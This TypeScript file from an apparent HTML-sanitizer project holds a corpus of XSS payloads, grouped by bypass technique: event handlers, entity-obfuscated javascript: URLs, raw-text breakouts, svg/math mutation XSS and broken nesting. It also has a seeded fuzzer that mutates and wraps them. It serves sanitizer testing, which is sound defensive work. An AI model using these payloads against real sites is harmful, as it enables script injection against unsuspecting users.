// An XSS corpus written for this project, grouped by the way each payload tries
// to get past a sanitizer, plus a seeded mutation generator. Not a test file.
// The test puts a plain-text marker paragraph before each input and checks it
// survives; the oracle itself works on the output's structure, not on words.

export interface Payload {
  family: string;
  html: string;
}

const fam = (family: string, items: string[]): Payload[] => items.map((html) => ({ family, html }));

export const CORPUS: Payload[] = [
  ...fam("handlers", [
    `<img src=x onerror=alert(1)>`,
    `<img src="x" onerror = "alert(1)">`,
    `<img src=x onerror=\`alert(1)\`>`,
    `<img/src/onerror=alert(1)>`,
    `<img\nsrc=x\nonerror\n=\nalert(1)>`,
    `<p onmouseover=alert(1)>hover</p>`,
    `<p ONCLICK='alert(1)'>click</p>`,
    `<div onfocus="alert(1)" tabindex=0>focus</div>`,
    `<a href="https://ok.example/" onclick="alert(1)" onauxclick=alert(2)>link</a>`,
    `<p style="background:url(x)" class="c" id="i" data-x="1">styled</p>`,
    `<table><tr><td onpointerenter=alert(1) colspan=2 style="x:y">cell</td></tr></table>`,
  ]),
  ...fam("schemes", [
    `<a href="javascript:alert(1)">x</a>`,
    `<a href="JaVaScRiPt:alert(1)">x</a>`,
    `<a href=" \tjavascript:alert(1)">x</a>`,
    `<a href="jav&#x09;ascript:alert(1)">x</a>`,
    `<a href="jav&#9ascript:alert(1)">x</a>`,
    `<a href="jav&Tab;ascript:alert(1)">x</a>`,
    `<a href="jav&NewLine;ascript:alert(1)">x</a>`,
    `<a href="javascript&colon;alert(1)">x</a>`,
    `<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58;alert(1)">x</a>`,
    `<a href="&#x6A;&#x61;vascript:alert(1)">x</a>`,
    `<a href="java\u0000script:alert(1)">x</a>`,
    `<a href="java\u0001script:alert(1)">x</a>`,
    `<a href="vbscript:msgbox(1)">x</a>`,
    `<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`,
    `<a href="DATA:text/html,x">x</a>`,
    `<a href="//other.example/x">x</a>`,
    `<a href="\\\\other.example\\x">x</a>`,
    `<a href="file:///etc/x">x</a>`,
    `<a href="https://ok.example/?q=&quot;onmouseover=&quot;alert(1)">x</a>`,
    `<a href='https://ok.example/"onmouseover="alert(1)'>x</a>`,
    `<a href="http://">x</a>`,
    `<a href>x</a>`,
    `<a href=javascript:alert(1)>x</a>`,
  ]),
  ...fam("dropped", [
    `<script>alert(1)</script>`,
    `<script src="https://other.example/x.js"></script>`,
    `<style>p{display:none}</style>`,
    `<title>t</title>`,
    `<iframe src="https://other.example/"></iframe>`,
    `<object data="x"></object>`,
    `<embed src="x">`,
    `<form action="https://other.example/"><input name=p><button>go</button></form>`,
    `<select><option>x</option></select>`,
    `<video src=x onerror=alert(1)></video>`,
    `<audio src=x onerror=alert(1)></audio>`,
    `<canvas>x</canvas>`,
    `<template><img src=x onerror=alert(1)></template>`,
    `<applet code=x></applet>`,
    `<frameset><frame src=x></frameset>`,
    `<noembed><img src=x onerror=alert(1)></noembed>`,
    `<meta http-equiv="refresh" content="0;url=https://other.example/">`,
    `<base href="https://other.example/">`,
    `<link rel=stylesheet href="https://other.example/x.css">`,
    `<img src="https://other.example/track.png">`,
    `<img src="//other.example/track.png">`,
    `<img src="data:image/png;base64,AAAA">`,
    `<img src="images/missing.png" alt="x">`,
  ]),
  ...fam("raw-text", [
    `<style></style><img src=x onerror=alert(1)>`,
    `<title></title><img src=x onerror=alert(1)>`,
    `<textarea></textarea><img src=x onerror=alert(1)>`,
    `<noscript></noscript><img src=x onerror=alert(1)>`,
    `<xmp></xmp><img src=x onerror=alert(1)>`,
    `<iframe></iframe><img src=x onerror=alert(1)>`,
    `<plaintext><img src=x onerror=alert(1)>`,
    `<style>/*</style><img src=x onerror=alert(1)>*/</style>`,
    `<script>"</script><img src=x onerror=alert(1)>"</script>`,
    `<textarea><p title="</textarea><img src=x onerror=alert(1)>"></textarea>`,
  ]),
  ...fam("mutation", [
    `<svg><style><img src=x onerror=alert(1)></style></svg>`,
    `<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>`,
    `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
    `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`,
    `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
    `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`,
    `<p title="<script>alert(1)</script>">x</p>`,
    `<p title='"><img src=x onerror=alert(1)>'>x</p>`,
    `<a title="x" href="https://ok.example/" title="y\u0022><img src=x onerror=alert(1)>">x</a>`,
    `<!--><img src=x onerror=alert(1)>-->`,
    `<!-- --!><img src=x onerror=alert(1)> -->`,
    `<![CDATA[<img src=x onerror=alert(1)>]]>`,
    `<?php echo 1; ?><img src=x onerror=alert(1)>`,
    `<!DOCTYPE html><img src=x onerror=alert(1)>`,
  ]),
  ...fam("broken-nesting", [
    `<scr<script>ipt>alert(1)</scr</script>ipt>`,
    `<<script>script>alert(1)<</script>/script>`,
    `<p><b><i>unclosed`,
    `<a href="https://ok.example/>x</a>`,
    `<a href="https://ok.example/" onclick="alert(1)>x</a>`,
    `<img src="x" onerror="alert(1)`,
    `<a/href="javascript:alert(1)">x</a>`,
    `<p\u0000onclick=alert(1)>x</p>`,
    `<sc\u0000ript>alert(1)</sc\u0000ript>`,
    `<script\n>alert(1)</script\n>`,
    `<script >alert(1)</script foo=bar>`,
    `</p></div></div></blockquote><img src=x onerror=alert(1)>`,
    `<div><p></div></p><script>alert(1)</script>`,
    `<table><script>alert(1)</script><tr><td><style>x</style>cell</td></tr></table>`,
    `<ns:script xmlns:ns="http://www.w3.org/1999/xhtml">alert(1)</ns:script>`,
    `<x:img xmlns:x="http://www.w3.org/1999/xhtml" src="x" onerror="alert(1)"/>`,
    `<svg:a xmlns:svg="http://www.w3.org/2000/svg" href="javascript:alert(1)">x</svg:a>`,
  ]),
  ...fam("self-closing", [
    `<script/>after-script <img src=x onerror=alert(1)>`,
    `<style/>after-style <img src=x onerror=alert(1)>`,
    `<script src="x"/><p>after</p>`,
    `<iframe src="x"/><p>after</p>`,
    `<textarea/><img src=x onerror=alert(1)>`,
    `<div/><img src=x onerror=alert(1)>`,
    `<a href="javascript:alert(1)"/>after`,
    `<p/>text<br/>text<hr/>text`,
  ]),
];

// Seeded PRNG (mulberry32): the same seed always yields the same inputs.
export function prng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

type Rand = () => number;
const pick = <T>(r: Rand, xs: readonly T[]): T => xs[Math.floor(r() * xs.length)]!;

const SCHEMES = ["javascript", "vbscript", "data", "file"];
const SCRIPTISH = [
  `<script>alert(1)</script>`,
  `<img src=x onerror=alert(1)>`,
  `<svg onload=alert(1)>`,
  `<a href="@S:alert(1)">x</a>`,
  `<p onclick=alert(1) style="x:y">x</p>`,
  `<iframe src="@S:alert(1)"></iframe>`,
  `<style>@import "x"</style>`,
  `<form><input></form>`,
];
const SEPARATORS = [
  "",
  "&#9;",
  "&#x0A;",
  "&Tab;",
  "&NewLine;",
  "\t",
  "\n",
  "\u0000",
  "\u0001",
  " ",
];
const COLONS = [":", "&colon;", "&#58;", "&#x3a;", "&#58", "&#x3A"];

/** Encodes some characters of `s` as numeric references, with or without `;`. */
function entityEncode(r: Rand, s: string): string {
  let out = "";
  for (const ch of s) {
    if (r() < 0.4) {
      const code = ch.charCodeAt(0);
      const body = r() < 0.5 ? `#${code}` : `#x${code.toString(16)}`;
      out += `&${body}${r() < 0.5 ? ";" : ""}`;
    } else out += ch;
  }
  return out;
}

const mixCase = (r: Rand, s: string) =>
  Array.from(s, (c) => (r() < 0.5 ? c.toUpperCase() : c.toLowerCase())).join("");

/** A scheme spelled in a mangled way, ending at the colon. */
function mangledScheme(r: Rand): string {
  let s = mixCase(r, pick(r, SCHEMES));
  if (r() < 0.6) s = entityEncode(r, s);
  if (r() < 0.5) {
    const i = 1 + Math.floor(r() * 4);
    s = s.slice(0, i) + pick(r, SEPARATORS) + s.slice(i);
  }
  return pick(r, ["", " ", "\n", "&#32;"]) + s + pick(r, COLONS);
}

function base(r: Rand): string {
  const payload = pick(r, SCRIPTISH);
  return payload.replace(/@S:/g, () => mangledScheme(r));
}

const CONTEXTS: ((inner: string) => string)[] = [
  (x) => x,
  (x) => `<p>${x}</p>`,
  (x) => `<a href="https://ok.example/">${x}</a>`,
  (x) => `<table><tr><td>${x}</td></tr></table>`,
  (x) => `<blockquote><div><em>${x}</em></div></blockquote>`,
  (x) => `<div><p>${x}`,
  (x) => `<p title="${x.replace(/"/g, "&quot;")}">t</p>`,
  (x) => `<b><i>${x}</i></b></p></div>`,
  (x) => `<noscript>${x}</noscript>`,
  (x) => `<svg>${x}</svg>`,
  (x) => `<style>${x}</style>`,
  (x) => `<textarea>${x}</textarea>`,
];

const MUTATIONS: ((r: Rand, s: string) => string)[] = [
  (r, s) => mixCase(r, s),
  (r, s) => s.replace(/=/g, () => pick(r, ["=", " = ", "\n=\n", "/="])),
  (r, s) => s.replace(/"/g, () => pick(r, ['"', "'", "", "`"])),
  (r, s) => s.replace(/<(\w)/g, (_m, c: string) => `<${pick(r, ["", "/", "\u0000", "\n"])}${c}`),
  (r, s) => s.replace(/ /g, () => pick(r, [" ", "\t", "\n", "/", "\u000c"])),
  (r, s) => {
    const i = Math.floor(r() * s.length);
    return s.slice(0, i) + pick(r, ["<", ">", '"', "'", "&", "&#", "<!--", "]]>"]) + s.slice(i);
  },
  (r, s) => s.slice(0, Math.floor(r() * s.length)), // truncation leaves tags and quotes unclosed
];

/** One generated input: a base payload, mutations, then a wrapping context. */
export function generate(r: Rand): string {
  let s = base(r);
  const n = Math.floor(r() * 3);
  for (let i = 0; i < n; i++) s = pick(r, MUTATIONS)(r, s);
  return pick(r, CONTEXTS)(s);
}

/** Corpus payloads put through the same mutations and contexts. */
export function mutateCorpus(r: Rand): string {
  let s = pick(r, CORPUS).html;
  const n = 1 + Math.floor(r() * 2);
  for (let i = 0; i < n; i++) s = pick(r, MUTATIONS)(r, s);
  return pick(r, CONTEXTS)(s);
}
